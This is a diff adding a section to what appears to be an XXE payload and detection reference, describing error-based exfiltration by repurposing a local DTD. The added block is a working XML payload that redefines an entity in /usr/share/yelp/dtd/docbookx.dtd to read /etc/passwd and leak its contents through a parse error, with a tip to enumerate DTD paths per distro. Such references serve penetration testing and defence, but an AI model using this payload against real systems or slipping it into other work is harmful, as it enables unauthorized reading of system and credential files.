@@ -101,6 +101,19 @@ lxml
 
 ## Payload & Detection Patterns
 
+### Error-based exfil via local-DTD repurposing (zero network egress)
+When both `file://` outbound AND external-DTD fetch are blocked, reference a DTD already on disk and redefine one of its internal entities so the target file content leaks in the parse error:
+```xml
+<!DOCTYPE foo [
+  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
+  <!ENTITY % ISOamso '
+    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
+    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; err SYSTEM &#x27;file:///nonexist/%file;&#x27;>">
+    %eval; %err;'>
+  %local_dtd; ]>
+```
+Needs zero network egress. Local DTD paths differ per distro (yelp/docbookx is common) — enumerate. (PortSwigger: XXE by repurposing a local DTD.)
+
 ### Classic In-Band File Read
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
